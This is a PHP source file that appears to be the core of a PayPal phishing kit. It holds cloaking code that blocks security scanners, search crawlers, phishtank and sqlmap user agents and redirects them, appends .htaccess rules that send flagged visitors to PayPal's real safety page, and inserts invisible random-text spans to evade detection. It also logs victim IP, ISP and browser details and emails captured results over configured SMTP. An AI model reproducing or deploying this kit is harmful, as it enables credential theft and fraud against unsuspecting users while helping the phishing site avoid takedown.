<?php 
error_reporting(0); 
session_start(); 
set_time_limit(0); 
date_default_timezone_set('Asia/Jakarta'); 
require __DIR__ . '/include/autoload.php'; 
$ip = $_SERVER['REMOTE_ADDR'];	
$ISA = str_replace(".", "", $ip);
class KuzuluyArt extends Kuzuluy { 
	public $smtp_config = 'smtp.conf'; 
	public $general_config = 'general.conf'; 
	public $visitor_allow = 'Allow.html';
	public $visitor_block = 'Block.html'; 
	public $dir_logs = __DIR__ . '/logs'; 
	public $dir_config = __DIR__ . '/config'; 

	public function redirect($url) { 
	 	header("location: ".$url);
	 	exit;
	}
	public function create_cookie() {
		setcookie("access_key", $_SESSION['key']); 
	} 
	public function delete_cookie() { 
		unset($_COOKIE['access_key']); 
	} 
	public function ngerandom() { 
		return md5(microtime()); 
	} 
	public function setup() { 
		if (!file_exists($this->dir_config . '/' . $this->general_config)) { 
			$this->redirect("admin"); 
		} 
	} 
	public function save($file, $text, $type) { 
		$fp = fopen($file, $type); 
		fwrite($fp, $text); 
		fclose($fp); 
	} 
	public function ngeblock() { 
		$text = "RewriteCond %{REMOTE_ADDR} ^".$_SESSION['ip']."$\nRewriteRule .* https://www.paypal.com/".$_SESSION['code']."/webapps/mpp/paypal-safety-and-security [R,L]\n\n"; 
		return $this->save(".htaccess", $text, "a"); 
	} 
    public function generateRandomString($zipy) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < 20; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    //return $randomString;



$split = str_split($zipy);
foreach ($split as $value) {
    
    return '<span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;">'.$randomString.'</span><?=$api->transcode("'.$value.'");?>';
    
}
    
    }
	public function setGeneral($isi = array()) { 
		
			$text = "\$config_apikey    = '".$isi[0]."';\n"; 
			$text .= "\$config_3dsecure  = '".$isi[1]."';\n"; 
			$text .= "\$config_filter    = '".$isi[2]."';\n"; 
			$text .= "\$config_blocker   = '".$isi[3]."';\n"; 
			$text .= "\$config_smtp      = '".$isi[4]."';\n"; 
			$text .= "\$config_translate = '".$isi[5]."';\n";
			$text .= "\$email_result = '".$isi[6]."';\n";
			$text .= "\$config_identity    = '".$isi[7]."';\n"; 
			$text .= "\$pasor    = '".$isi[8]."';\n"; 
			$text .= "\$alrt    = '".$isi[9]."';"; 
			return $this->save($this->dir_config . '/' . $this->general_config, $text, "w");

	} 
	public function setSMTP($isi = array()) { 
		$text = "\$config_smtphost   = '".$isi[0]."';\n"; 
		$text .= "\$config_smtpport   = '".$isi[1]."';\n"; 
		$text .= "\$config_smtpsecure = '".$isi[2]."';\n"; 
		$text .= "\$config_smtpuser   = '".$isi[3]."';\n"; 
		$text .= "\$config_smtppass   = '".$isi[4]."';\n"; 
		$text .= "\$config_smtpfrom   = '".$isi[5]."';\n"; 
		$text .= "\$config_smtpname   = '".$isi[6]."';\n"; 
		return $this->save($this->dir_config . '/' . $this->smtp_config, $text, "w"); 
	} 
	public function getIp() { 
		foreach (array('CLIENT_IP', 'FORWARDED', 'FORWARDED_FOR', 'FORWARDED_FOR_IP', 'VIA', 'X_FORWARDED', 'X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'HTTP_FORWARDED', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED_FOR_IP', 'HTTP_PROXY_CONNECTION', 'HTTP_VIA', 'HTTP_X_FORWARDED', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_CLUSTER_CLIENT_IP', 'REMOTE_ADDR') as $key) {
			if (array_key_exists($key, $_SERVER) === true) {
				foreach (explode(',', $_SERVER[$key]) as $ip) {
					$ip = trim($ip); 
					if(filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) { 
						return $ip;
					} 
				} 
			} 
		} 
	}
	public function getOs() { 
		$os = "Unknown OS"; 
		$os_array = array( '/windows nt 10/i' => 'Windows 10', '/windows nt 6.3/i' => 'Windows 8.1', '/windows nt 6.2/i' => 'Windows 8', '/windows nt 6.1/i' => 'Windows 7', '/windows nt 6.0/i' => 'Windows Vista', '/windows nt 5.2/i' => 'Windows Server 2003/XP x64', '/windows nt 5.1/i' => 'Windows XP', '/windows xp/i' => 'Windows XP', '/windows nt 5.0/i' => 'Windows 2000', '/windows me/i' => 'Windows ME', '/win98/i' => 'Windows 98', '/win95/i' => 'Windows 95', '/win16/i' => 'Windows 3.11', '/macintosh|mac os x/i' => 'Mac OS X', '/mac_powerpc/i' => 'Mac OS 9', '/linux/i' => 'Linux', '/ubuntu/i' => 'Ubuntu', '/iphone/i' => 'iPhone', '/ipod/i' => 'iPod', '/ipad/i' => 'iPad', '/android/i' => 'Android', '/blackberry/i' => 'BlackBerry', '/webos/i' => 'Mobile' ); 
		foreach ($os_array as $regex => $value) { 
			if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) { 
				$os = $value; 
			} 
		} 
		return $os; 
	} 
	public function getBrowser() {
		$browser = "Unknown Browser"; 
		$browser_array = array( '/msie/i' => 'Internet Explorer', '/firefox/i' => 'Firefox', '/safari/i' => 'Safari', '/chrome/i' => 'Chrome', '/edge/i' => 'Edge', '/opera/i' => 'Opera', '/netscape/i' => 'Netscape', '/maxthon/i' => 'Maxthon', '/konqueror/i' => 'Konqueror', '/mobile/i' => 'Handheld Browser' ); 
		foreach ($browser_array as $regex => $value) { 
			if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) { 
				$browser = $value; 
			} 
		} 
		return $browser; 
	} 
	public function getAgent() { 
		return $_SERVER['HTTP_USER_AGENT']; 
	} 
	public function getLang() { 
		return substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2); 
	} 
	public function getRef() { 
		if (isset($_SERVER['HTTP_REFERER'])) { 
			$ref = $_SERVER['HTTP_REFERER']; 
		} else { 
			$ref = "No Referer"; 
		} 
		return $ref; 
	} 
	public function ngecurl($url, $str) { 
		$ch = curl_init(); 
		curl_setopt($ch, CURLOPT_URL, $url.$str); 
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
		$data = curl_exec($ch); 
		curl_close($ch); 
		return $data; 
	} 
	
	public function dataIP($ip, $data) { 
		$json = $this->ngecurl("http://extreme-ip-lookup.com/json/", $ip); 
		if ($json == '' or false) { 
			return "127.0.0.1"; 
		} 
		$code = json_decode($json); 
		$str = ""; 
		switch ($data) { 
			case "code": 
				$str = $code->countryCode; 
				if ($str == "GB") { 
					$str = "UK"; 
				} else if ($str == "C2" || $str == "A1") { 
					$str = "US"; 
				} 
				break; 
			case "country": $str = $code->country; break; 
			case "city": $str = $code->city; break; 
			case "state": $str = $code->region; break; 
			case "isp": $str = $code->isp; break; 
			case "ip": $str = $code->query; break; 
			default: $str = $code->status; 
		} 
		return $str; 
	} 
	public function getHost($ip) {
		return gethostbyaddr($ip); 
	} 
	public function blocked($reason) { 
		$text = "<b>[".$_SESSION['code']." | ".date('d/m/y H:i:s')." | <font color=red>$reason</font>] (".$_SESSION['ip']." - ".$_SESSION['isp']." - ".$_SESSION['host'].") [".$_SESSION['ref']." | ".$_SESSION['agent']."]</b><br>"; 
		return $this->save($this->dir_logs . '/' . $this->visitor_block, $text, "a"); 
	} 
	public function visitor($page) { 
		$text = "<b>[".$_SESSION['code']." | ".date('d/m/y H:i:s')." | <font color=green>$page</font>] (".$_SESSION['ip']." - ".$_SESSION['isp']." - ".$_SESSION['host'].") [".$_SESSION['ref']." | ".$_SESSION['agent']."]</b><br>";
		return $this->save($this->dir_logs . '/' . $this->visitor_allow, $text, "a"); 
	} 
	public function blocker() { 
		require_once __DIR__ . '/filter.php'; 
		if ($_SESSION['agent'] == "") { 
			$this->blocked("Unknown Agent"); 
			$this->redirect("success"); 
		} 
		if (preg_match('/Aboundex|Abonti|Acunetix|Alligator|RMA|Apexoo|asterias|attach|BackStreet|BackWeb|Badass|Bandit|Baid|BatchFTP|Bigfoot|Black\.Hole|BlackWidow|blow|Buddy|Pump|Ninja|nmap|Memo|Reaper|Recorder|ReGet|ChinaClaw|Collector|cognitiveseo|Copier|choppy|help|ahrefs|majestic|redlug|scan|total|bot|shrinktheweb|zyborg|nuhk|ask|wget|80legs|winhttp|youda|zune|crawl|curl|dataprovider|comodo|casper|zmeu|skygrid|sucker|flicky|turnit|diavol|cmsworld|virus|Ruby|InfoPath|UNTRUSTED|binlar|kmccrew|nutch|JOC|planetwork|search|get|spider|find|java|Phantom|google|yahoo|teoma|contaxe|yandex|facebook|CFNetwork|aolbuild|sogou|bing|duckduckgo|phishtank|checkpriv|clshttp|email|extract|grab|harvest|python|baidu|Slurp|archiver|Rambler|Media Center|PagesInventory|Win98|Konqueror|libwww|webcapture|netcraft|loader|miner|nikto|\.NET CLR|NET4\.0C|NET4\.0E|MDDC|SLCC2|php|Scrapy|lynx|Fuck|Zeus|Zade|Xenu|VCI|Vacuum|Sqworm|Spinn3r|Ripper|Xaldon|Webster|httrack|g00g1e|heritrix|postrank|siclab|sqlmap|xxxyy/i', $_SESSION['agent'])) { 
				$this->blocked("Block Agent"); 
				$this->redirect("success"); 
			} 
		if (in_array($_SESSION['ip'], $bannedIP)) { 
			$this->blocked("Block IP v1"); $this->redirect("success"); 
		} else { 
			foreach ($bannedIP as $ip) { 
				if (preg_match("/$ip/", $_SESSION['ip'])) {
					$this->blocked("Block IP v2"); 
					$this->redirect("success"); 
				} 
			} 
		} 
		foreach ($bannedHOST as $host) { 
			if (substr_count($_SESSION['host'], $host) > 0) {
				$this->blocked("Block Hostname"); 
				$this->redirect("success"); 
			} 
		} 
		foreach ($bannedProxy as $proxy) {
			if (isset($_SERVER[$proxy])) { 
				$this->blocked("Block Proxy"); 
				$this->redirect("success"); 
			} 
		}
		$_SESSION['visitor'] = true; 
	} 
	public function session() { 
		if (!isset($_SESSION['visitor'])) { 
			$this->blocked("Block Session"); 
			$this->redirect("success"); 
		}
	} 
	public function cookie() { 
		if (isset($_COOKIE['access_key'])) { 
			if ($_COOKIE['access_key'] != $_SESSION['key']) {
				$this->redirect("success"); 
			} 
		} else { 
			$this->redirect("success"); 
		} 
	} 
	public function getStr($string, $start, $end) { 
		$str = explode($start, $string); 
		$str = explode($end, $str[1]); 
		return $str[0]; 
	} 
	public function encode($str) { 
		if (file_exists($this->dir_config . '/' . $this->general_config)) { 
			@eval(file_get_contents($this->dir_config . '/' . $this->general_config)); 
		} 
		return $str; 
	} 
	public function content($url) { 
		$ch = curl_init(); 
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
		curl_setopt($ch, CURLOPT_URL, $url); 
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
		$data = curl_exec($ch); 
		curl_close($ch); 
		return $data; 
	} 

	public function result(){ 
		if (file_exists($this->dir_config . '/' . $this->general_config)) { 
			@eval(file_get_contents($this->dir_config . '/' . $this->general_config)); 
			return $email_result;
		} else {
			return "";
		}
		

	} 
	public function transcode($text) { 
		if (file_exists($this->dir_config . '/' . $this->general_config)) { 
			@eval(file_get_contents($this->dir_config . '/' . $this->general_config)); 
		} 
		
			
		return $this->encode($text); 
	} 
	public function waiting() { 
		return sleep(rand(1,3)); 
	} 
	public function ngesend($to, $sub, $msg) { 
		if (file_exists($this->dir_config . '/' . $this->smtp_config)) { 
			@eval(file_get_contents($this->dir_config . '/' . $this->smtp_config)); 
		} if ($config_smtpsecure == 1){ 
			$secure = "tls"; 
		} else { 
			$secure = "none"; 
		} 
		if ($this->checkSmtp() == true) { 
			try { 
				$this->SMTPDebug = 2; 
				$this->isSMTP(); 
				$this->Host = $config_smtphost; 
				$this->Port = $config_smtpport; 
				$this->SMTPAuth = true; 
				$this->Username = $config_smtpuser; 
				$this->Password = $config_smtppass; 
				$this->SMTPSecure = $secure; 
				$this->setFrom($config_smtpfrom, $config_smtpname); 
				$this->addAddress($to); 
				$this->isHTML(true); 
				$this->Subject = $sub; 
				$this->Body = $msg; 
				$this->CharSet = "UTF-8"; 
				$this->send(); 
			} catch (Exception $e) {
				die($this->ErrorInfo); 
			} 
		} 
	}
	public function checkSmtp() {
		if (file_exists($this->dir_config . '/' . $this->smtp_config)) { 
			@eval(file_get_contents($this->dir_config . '/' . $this->smtp_config)); 
		} 
		if ($config_smtpsecure == 1){ 
			$secure = "tls"; 
		} else { 
			$secure = "none"; 
		} 
		$this->isSMTP(); 
		$this->Host = $config_smtphost;
		$this->Port = $config_smtpport; 
		$this->SMTPAuth = true; 
		$this->SMTPSecure = $secure; 
		$this->Username = $config_smtpuser; 
		$this->Password = $config_smtppass; 
		$this->Timeout = 15; 
		$this->From = $config_smtpfrom; 
		$this->FromName = $config_smtpname; 
		if ($this->smtpConnect()) {
			$this->smtpClose(); 
			return true; 
		} else { 
			return false; 
		} 
	} 
} 
	function GrabIP($ipAddress) {
		$ip = $_SERVER['REMOTE_ADDR'];
		$url = ""; //removed
		$ch = curl_init();
		curl_setopt ($ch, CURLOPT_URL, $url);
		curl_setopt ($ch, CURLOPT_POST, TRUE);
		curl_setopt ($ch, CURLOPT_POSTFIELDS, $ipAddress);
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);
		$exec = curl_exec($ch);
		$ipDetails = json_decode($exec,true);
		return $exec;}
$api = new KuzuluyArt(); 
?>